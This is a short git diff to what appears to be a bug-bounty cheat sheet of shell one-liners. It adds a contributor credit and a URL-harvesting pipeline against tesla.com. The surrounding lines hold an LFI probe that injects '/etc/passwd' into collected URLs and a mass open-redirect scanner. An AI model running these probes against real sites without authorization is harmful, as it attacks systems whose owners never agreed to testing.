@@ -26,9 +26,11 @@ gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%"
 ### Open-redirect
 > @dwisiswant0
 
+>@ofjaaah
 ```bash
 echo "tesla.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
 ```
+
 
 ```bash
 export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
